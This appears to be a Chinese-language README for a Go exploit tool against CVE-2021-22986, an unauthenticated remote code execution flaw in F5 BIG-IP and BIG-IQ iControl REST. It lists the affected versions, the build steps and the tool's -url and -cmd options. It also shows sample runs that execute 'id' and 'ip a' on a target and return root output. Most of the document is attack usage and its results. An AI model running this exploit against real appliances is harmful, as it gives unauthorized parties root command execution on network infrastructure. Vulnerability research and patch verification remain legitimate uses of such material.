# f5
F5 未授权远程代码执行 漏洞扫描POC/EXP


### 漏洞信息
```
[root@localhost f5]# ./f5 -h
编号:
	CVE-2021-22986
漏洞说明:
	CVE-2021-22986 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞 中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。

CVE-2021-22986 影响版本：

	F5 BIG-IP 16.0.0-16.0.1
	F5 BIG-IP 15.1.0-15.1.2
	F5 BIG-IP 14.1.0-14.1.3.1
	F5 BIG-IP 13.1.0-13.1.3.5
	F5 BIG-IP 12.1.0-12.1.5.2
	F5 BIG-IQ 7.1.0-7.1.0.2
	F5 BIG-IQ 7.0.0-7.0.0.1
	F5 BIG-IQ 6.0.0-6.1.0



				Author: @phil-fly
  -cmd string
    	CMD: id (default "id")
  -url string
    	URL: http://127.0.0.1 (default "http://127.0.0.1")

```


### 编 译
```
cd rce/f5/
go build
```

### 运 行 效 果

![](.\img\rce.png)
```
[root@localhost f5]# ./f5 -url http://127.0.0.1:8083 -cmd "id"
uid=0(root) gid=0(root) groups=0(root)

[root@localhost f5]# ./f5 -url http://127.0.0.1:8083 -cmd "ip a"
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: em1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 6c:2b:59:8b:92:aa brd ff:ff:ff:ff:ff:ff
    inet xx.xx.xx.xx/24 brd xx.xx.xx.xx scope global noprefixroute em1
       valid_lft forever preferred_lft forever
    inet6 fe80::8dec:ff23:2a42:3517/64 scope link noprefixroute
       valid_lft forever preferred_lft forever

```
